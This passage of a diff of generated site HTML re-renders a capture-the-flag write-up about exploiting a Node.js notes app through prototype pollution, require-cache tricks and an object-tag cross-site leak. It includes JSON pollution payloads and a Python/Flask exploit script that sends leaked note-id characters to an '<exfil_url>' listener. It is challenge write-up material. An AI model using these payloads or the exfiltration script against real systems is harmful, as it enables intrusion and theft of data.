-</code></pre><p>Sending the above payloads to /customise endpoint and then <code>/create</code> to create a note will pollute the required fields which will set <code>/notes/di1k8m47ob.json</code> as the module to be loaded whenever <code>/notes/Healthcheck</code> is &ldquo;require&quot;d. ie. sending request to /view/Healthcheck after doing the pollution should result in di1k8m47ob.json being rendered.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data={};optional&#34;</span>},{<span style="color:#f92672">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data.name=\&#34;./notes/Healthcheck\&#34;;optional&#34;</span>},{<span style="color:#f92672">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data.exports=\&#34;./notes/di1k8m47ob.json\&#34;;optional&#34;</span>},{<span style="color:#f92672">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span></code></pre></div><p>Sending the above payloads to /customise endpoint and then <code>/create</code> to create a note will pollute the required fields which will set <code>/notes/di1k8m47ob.json</code> as the module to be loaded whenever <code>/notes/Healthcheck</code> is &ldquo;require&quot;d. ie. sending request to /view/Healthcheck after doing the pollution should result in di1k8m47ob.json being rendered.
 Here is where we will face another road-block.</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.get(&#39;/view/:noteId&#39;, (req, res) =&gt; {
-  const noteId = req.params.noteId;
-
-  try {
-    let note=require.resolve(`./notes/${noteId}`);
-    if(!note.endsWith(&#34;.json&#34;)){
-      return res.status(500).json({ Message: &#39;Internal Server Error&#39; });
-    }
-
-    let noteData = require(`./notes/${noteId}`);
-    for (var key in module.constructor._pathCache) {
-      if (key.startsWith(&#34;./notes/&#34;+noteId)){
-        if (!module.constructor._pathCache[key].endsWith(noteId+&#34;.json&#34;)){
-          if (noteId===healthCheckId){
-            cleanserver();
-          }
-          delete module.constructor._pathCache[key];
-          return res.status(500).json({ Message: &#39;Internal Server Error&#39; });
-        }
-      }
-    }
-...
-</code></pre><p>There are checks implemented here on <code>_pathCache</code> to check whether the module that is loaded is the one that is actually required.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/view/:noteId&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">noteId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">noteId</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">note</span><span style="color:#f92672">=</span><span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">resolve</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;.json&#34;</span>)){
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Internal Server Error&#39;</span> });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">noteData</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">`./notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">_pathCache</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;./notes/&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">noteId</span>)){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">_pathCache</span>[<span style="color:#a6e22e">key</span>].<span style="color:#a6e22e">endsWith</span>(<span style="color:#a6e22e">noteId</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.json&#34;</span>)){
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">noteId</span><span style="color:#f92672">===</span><span style="color:#a6e22e">healthCheckId</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">cleanserver</span>();
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">_pathCache</span>[<span style="color:#a6e22e">key</span>];
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">json</span>({ <span style="color:#a6e22e">Message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Internal Server Error&#39;</span> });
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>There are checks implemented here on <code>_pathCache</code> to check whether the module that is loaded is the one that is actually required.</p>
 <p>This check can be bypassed but before that lets have a quick rundown of how <code>require()</code> actually works. (The challenge uses node 20.2.0 and a few changes have happened since then ).</p>
 <p><a href="https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023" target="_blank">https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023</a>
 The three functions involved here are <code>Module._load</code>, <code>Module._resolveFilename</code> and <code>module._findPath()</code>.
@@ -623,12 +623,12 @@ When we use prototype pollution to &ldquo;remap&rdquo; lets say, note <code>abc<
 <code>filename</code> returned to <code>Module._load</code> is that of <code>xyz</code> and that is xyz is loaded into <code>Module._cache[&lt;xyz filepath&gt;]</code>. <code>relativeResolveCache[relResolveCacheIdentifier of abc]</code> is set to <code>&lt;xyz filepath&gt;</code>.</p>
 <p>If <code>_pathCache</code> key and value do not match, the entry is deleted from <code>_pathCache</code>.</p>
 <p>If the attack is tried on Healthcheck noteId, the cleanserver() function also gets executed</p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">const cleanserver = () =&gt; {
-  Object.keys(require.cache).forEach(i =&gt; {
-    delete require.cache[i];
-  });
-};
-</code></pre><p>This basically means that if <code>/note/Healthcheck -&gt;  /note/attackernote</code> is set, cache is cleared and the require gadget will not work. Our plan for rebinding Healthcheck note to attacker note will fail except for the fact that when cache is cleared, relativeResolveCache entries are not deleted. The entry in relativeResolveCache is deleted when require tries to load the module and it does not exist in require.cache.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cleanserver</span> <span style="color:#f92672">=</span> () =&gt; {
+</span></span><span style="display:flex;"><span>  Object.<span style="color:#a6e22e">keys</span>(<span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">cache</span>).<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">i</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">delete</span> <span style="color:#a6e22e">require</span>.<span style="color:#a6e22e">cache</span>[<span style="color:#a6e22e">i</span>];
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>This basically means that if <code>/note/Healthcheck -&gt;  /note/attackernote</code> is set, cache is cleared and the require gadget will not work. Our plan for rebinding Healthcheck note to attacker note will fail except for the fact that when cache is cleared, relativeResolveCache entries are not deleted. The entry in relativeResolveCache is deleted when require tries to load the module and it does not exist in require.cache.</p>
 <p>This opens up the possiblity of the following
 First pollute <code>/note/Healthcheck</code> -&gt; <code>/note/attacker.json</code>
 Then visit <code>/view/Healthcheck</code> to delete pathcache entries which prevent note rendering.
@@ -643,118 +643,118 @@ We can nest tags like <code>&lt;object data='http://127.0.0.1:3000/search/a'&gt;
 <p><em>This is where I might have overly complicated stuff</em></p>
 <p>The note id is 16 characters in length. We can leak id character by character by using <code>payload=payload+f&quot;&lt;object data='http://127.0.0.1:3000/search/{i}'&gt;&lt;object data='&lt;exfil_url&gt;/found/{i}'&gt;&lt;/object&gt;&lt;/object&gt;&quot;</code> and replacing <code>{i}</code> with the found id. In order to leak all characters, we can create multiple notes with one or two characters leak each. But here is where another problem occurs. If we want to pollute Healthcheck to a new note with the prototype won&rsquo;t be overwritten if we do the pollution again, it will create an array with both old and new polluted values. ie. data.name will become [&rsquo;/note/first&rsquo;,&rsquo;/notes/second&rsquo;]</p>
 <p>To get around this, we can pollute <code>data</code> once more, make it an array, then send an empty json <code>{}</code> to <code>/customise</code></p>
-<pre tabindex="0"><code class="language-javascript=" data-lang="javascript=">app.post(&#39;/customise&#39;,(req, res) =&gt; {
-  try {
-    const { data } = req.body;
-
-    let author = data.pop()[&#39;author&#39;];
-
-    let title = data.pop()[&#39;title&#39;];
-...
-</code></pre><p>data.pop() is called and the data array is cleared. Now polluting data.name and data.exports will take effect.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/customise&#39;</span>,(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">data</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">author</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">pop</span>()[<span style="color:#e6db74">&#39;author&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">pop</span>()[<span style="color:#e6db74">&#39;title&#39;</span>];
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>data.pop() is called and the data array is cleared. Now polluting data.name and data.exports will take effect.</p>
 <p>The following script combines all these actions to leak the flag character by character:</p>
-<pre tabindex="0"><code class="language-python=" data-lang="python=">import requests
-from flask import Flask
-import string
-import time
-from threading import Thread
-
-
-charset=string.digits+string.ascii_lowercase
-url=&#34;&lt;instance_url&gt;&#34;
-proxies={&#34;http&#34;:&#34;http://127.0.0.1:8080&#34;,&#34;https&#34;:&#34;http://127.0.0.1:8080&#34;}
-useless={&#34;title&#34;:&#34;useless&#34;,&#34;content&#34;:&#34;just useless&#34;}
-
-app = Flask(__name__)
-
-def gen_payload(fchar):
-    payload=&#34;&#34;
-    for i in charset:
-        i=fchar+i
-        payload=payload+f&#34;&lt;object data=&#39;http://127.0.0.1:3000/search/{i}&#39;&gt;&lt;object data=&#39;&lt;exfil_url&gt;/found/{i}&#39;&gt;&lt;/object&gt;&lt;/object&gt;&#34;
-    return payload
-
-# Reset settings.proto to clean
-def reset_settings():
-	options={&#34;data&#34;:[{&#34;title&#34;:&#34;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-	r=requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-	print(r.text)
-
-
-# Write payload note:
-def write_expl(expl):
-	reset_settings()
-	payload={&#34;title&#34;:&#34;asdf&#34;,&#34;content&#34;:expl}
-	r=requests.post(url+&#34;create&#34;, json=payload, proxies=proxies, verify=False)
-	print(&#34;Message From write_expl&#34;,r.json()[&#34;Message&#34;])
-	payload_id=r.json()[&#34;Noteid&#34;]
-	return payload_id
-
-
-def polluter(x,y):
-	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data={};optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
-	options={} # For data.pop()
-	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-	#change name to healthcheck note id
-	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.name=\&#34;./notes/&#34;+x+&#34;\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
-	#change name to exploit note id
-	options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.data.exports=\&#34;./notes/&#34;+y+&#34;.json\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-	requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-	requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
-
-
-def one_step(note):
-	requests.get(url+&#34;delete&#34;) # clear cache
-	note_id=write_expl(note)
-	polluter(&#34;Healthcheck&#34;,note_id)
-	requests.get(url+&#34;view/Healthcheck&#34;, verify=False) # get Healthcheck-&gt;note_id into resolve cache &amp; deletes require cache and pathcache
-	
-	polluter(&#34;777&#34;,note_id)
-	requests.get(url+&#34;view/777&#34;, verify=False) # get note_id into require cache so Healthcheck-&gt;note_id becomes alive again
-	requests.get(url+&#34;view/&#34;+note_id+&#34;?temp&#34;, verify=False) # delete exploit note from file system
-	r=requests.get(url+&#34;healthcheck&#34;, verify=False) 
-	print(r.text)
-	
-
-# Starting off
-#path has to be set only once
-#data pop trick also only once needed but does not affect much if done over again also
-
-print(&#34;wht&#34;)
-requests.packages.urllib3.disable_warnings()
-options={&#34;data&#34;:[{&#34;title&#34;:&#34;option(a).constructor.prototype.path=\&#34;./\&#34;;optional&#34;},{&#34;author&#34;:&#34;optional&#34;}]}
-requests.post(url+&#34;customise&#34;, json=options, proxies=proxies, verify=False)
-requests.post(url+&#34;create&#34;, json=useless, proxies=proxies, verify=False)
-
-
-def attack(found):
-	payload=gen_payload(found)
-	one_step(payload)
-
-
-@app.route(&#39;/&#39;)
-def hello():
-	attack(&#34;&#34;)
-	return &#39;Hello, attacker!&#39;
-
-@app.route(&#39;/found/&lt;note&gt;&#39;)
-def found(note):
-	print(&#34;Found: &#34;,note)
-	try:
-		thread=Thread(target=attack,args=(note,))
-		thread.start()
-	except Exception as e:
-		print(e)
-	return f&#39;You found: {note}&#39;
-
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&#39;0.0.0.0&#39;)
-</code></pre><p>This will retreive all but last character of the flag note id which can be bruteforced to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>charset<span style="color:#f92672">=</span>string<span style="color:#f92672">.</span>digits<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>ascii_lowercase
+</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;instance_url&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>proxies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;http&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>,<span style="color:#e6db74">&#34;https&#34;</span>:<span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>}
+</span></span><span style="display:flex;"><span>useless<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;useless&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span>:<span style="color:#e6db74">&#34;just useless&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_payload</span>(fchar):
+</span></span><span style="display:flex;"><span>    payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> charset:
+</span></span><span style="display:flex;"><span>        i<span style="color:#f92672">=</span>fchar<span style="color:#f92672">+</span>i
+</span></span><span style="display:flex;"><span>        payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">+</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&lt;object data=&#39;http://127.0.0.1:3000/search/</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&gt;&lt;object data=&#39;&lt;exfil_url&gt;/found/</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&gt;&lt;/object&gt;&lt;/object&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reset settings.proto to clean</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">reset_settings</span>():
+</span></span><span style="display:flex;"><span>	options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;data&#34;</span>:[{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>},{<span style="color:#e6db74">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write payload note:</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_expl</span>(expl):
+</span></span><span style="display:flex;"><span>	reset_settings()
+</span></span><span style="display:flex;"><span>	payload<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;asdf&#34;</span>,<span style="color:#e6db74">&#34;content&#34;</span>:expl}
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;create&#34;</span>, json<span style="color:#f92672">=</span>payload, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;Message From write_expl&#34;</span>,r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;Message&#34;</span>])
+</span></span><span style="display:flex;"><span>	payload_id<span style="color:#f92672">=</span>r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;Noteid&#34;</span>]
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> payload_id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">polluter</span>(x,y):
+</span></span><span style="display:flex;"><span>	options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;data&#34;</span>:[{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data=</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">;optional&#34;</span>},{<span style="color:#e6db74">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;create&#34;</span>, json<span style="color:#f92672">=</span>useless, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	options<span style="color:#f92672">=</span>{} <span style="color:#75715e"># For data.pop()</span>
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#change name to healthcheck note id</span>
+</span></span><span style="display:flex;"><span>	options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;data&#34;</span>:[{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data.name=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">./notes/&#34;</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;optional&#34;</span>},{<span style="color:#e6db74">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;create&#34;</span>, json<span style="color:#f92672">=</span>useless, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">#change name to exploit note id</span>
+</span></span><span style="display:flex;"><span>	options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;data&#34;</span>:[{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.data.exports=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">./notes/&#34;</span><span style="color:#f92672">+</span>y<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;.json</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;optional&#34;</span>},{<span style="color:#e6db74">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;customise&#34;</span>, json<span style="color:#f92672">=</span>options, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;create&#34;</span>, json<span style="color:#f92672">=</span>useless, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">one_step</span>(note):
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;delete&#34;</span>) <span style="color:#75715e"># clear cache</span>
+</span></span><span style="display:flex;"><span>	note_id<span style="color:#f92672">=</span>write_expl(note)
+</span></span><span style="display:flex;"><span>	polluter(<span style="color:#e6db74">&#34;Healthcheck&#34;</span>,note_id)
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;view/Healthcheck&#34;</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) <span style="color:#75715e"># get Healthcheck-&gt;note_id into resolve cache &amp; deletes require cache and pathcache</span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	polluter(<span style="color:#e6db74">&#34;777&#34;</span>,note_id)
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;view/777&#34;</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) <span style="color:#75715e"># get note_id into require cache so Healthcheck-&gt;note_id becomes alive again</span>
+</span></span><span style="display:flex;"><span>	requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;view/&#34;</span><span style="color:#f92672">+</span>note_id<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;?temp&#34;</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) <span style="color:#75715e"># delete exploit note from file system</span>
+</span></span><span style="display:flex;"><span>	r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;healthcheck&#34;</span>, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>) 
+</span></span><span style="display:flex;"><span>	print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Starting off</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#path has to be set only once</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#data pop trick also only once needed but does not affect much if done over again also</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;wht&#34;</span>)
+</span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;data&#34;</span>:[{<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;option(a).constructor.prototype.path=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">./</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">;optional&#34;</span>},{<span style="color:#e6db74">&#34;author&#34;</span>:<span style="color:#e6db74">&#34;optional&#34;</span>}]}
